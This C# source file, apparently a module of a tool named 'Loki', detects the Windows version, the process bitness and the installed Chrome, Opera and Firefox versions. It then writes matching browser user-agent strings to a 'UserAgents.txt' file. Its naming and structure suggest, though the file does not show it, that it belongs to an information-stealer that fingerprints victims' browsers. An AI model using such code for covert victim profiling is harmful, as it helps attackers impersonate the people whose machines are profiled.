namespace Loki.Utilities
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Management;
    using loki;
    using Microsoft.Win32;

    internal class UserAgents
    {
        public static string razr;

        public static string NT { get; set; }

        private static ManagementObject GetNTVersion(string className)
        {
            using (var managementClass = new ManagementClass(className))
            {
                foreach (ManagementBaseObject instance in managementClass.GetInstances())
                {
                    using (var managementObject = (ManagementObject)instance)
                    {
                        if (managementObject != null)
                        {
                            return managementObject;
                        }
                    }
                }
            }
            return null;
        }
        private static string GetOsVer()
        {
            try
            {
                using (ManagementObject managementObject = GetNTVersion("Win32_OperatingSystem"))
                {
                    return managementObject != null ? managementObject["Version"] as string : string.Empty;
                }
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
        public static string GetNTVersion()
        {
            try
            {
                return GetOsVer();
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static void Get_agent(string dir)
        {
            {
                GetOSBit();
                NT = GetNTVersion();

                string[] array = NT.Split('.');
                string text = string.Empty;

                if (array.Contains("10"))
                {
                    text = "Windows NT 10.0";
                }
                if (array.Length > 1 && !array.Contains("10"))
                {
                    text = $"Windows NT {array[0]}.{array[1]}";
                }

                try
                {
                    using (var stream = new StreamWriter(dir + "\\UserAgents.txt"))
                    {
                        string empty;
                        if (Directory.Exists($"{Environment.GetEnvironmentVariable("LocalAppData")}\\Google\\Chrome\\User Data"))
                        {
                            object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                            if (value != null)
                            {
                                empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
                            }
                            else
                            {
                                value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                                empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
                            }
                            switch (razr)
                            {
                                case "x64":
                                    stream.WriteLine($"Mozilla/5.0 ({text}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{empty} Safari/537.36");
                                    break;
                                default:
                                    stream.WriteLine($"Mozilla/5.0 ({text}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{empty} Safari/537.36");
                                    break;
                            }
                        }
                        if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
                        {
                            try
                            {
                                string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
                                text2 = text2.Remove(text2.Length - 6, 6);
                                text2 = text2.Remove(0, 1);
                                empty = FileVersionInfo.GetVersionInfo(text2).FileVersion;
                                string text3 = string.Empty;
                                string empty2 = string.Empty;
                                if (empty.Split('.').First().Equals("54"))
                                {
                                    text3 = "67.0.3396.87";
                                }
                                if (empty.Split('.').First().Equals("55"))
                                {
                                    text3 = "68.0.3440.106";
                                }
                                if (empty.Split('.').First().Equals("56"))
                                {
                                    text3 = "69.0.3497.100";
                                }
                                if (empty.Split('.').First().Equals("57"))
                                {
                                    text3 = "70.0.3538.102";
                                }
                                switch (razr)
                                {
                                    case "x64":
                                        stream.WriteLine($"Mozilla/5.0 ({text}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{text3} Safari/537.36 OPR/55.0.2994.44");
                                        break;
                                    default:
                                        stream.WriteLine($"Mozilla/5.0 ({text}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{text3} Safari/537.36 OPR/55.0.2994.44");
                                        break;
                                }
                            }
                            catch (Exception) { }
                        }

                        if (File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
                        {
                            object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                            if (value2 != null)
                            {
                                empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
                            }
                            else
                            {
                                value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                                empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
                            }
                            string empty3 = string.Empty;
                            empty3 = empty.Split('.').First() + "." + empty.Split('.')[1];
                            if (razr == "x64")
                            {
                                stream.WriteLine("Mozilla/5.0 (" + text + "; Win64; x64; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
                            }
                            else
                            {
                                stream.WriteLine("Mozilla/5.0 (" + text + "; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
                            }
                        }
                    }
                }
                catch (Exception) { }
            }
        }

        public static string GetOSBit()
        {
            bool is64bit = Is64Bit();
            if (is64bit)
            {
                razr = "x64";
                return "x64";
            }
            else
            {
                razr = "x32";
                return "x32";
            }
        }

        public static bool Is64Bit()
        {
            NativeMethods.IsWow64Process(Process.GetCurrentProcess().Handle, out bool retVal);
            return retVal;
        }
    }
}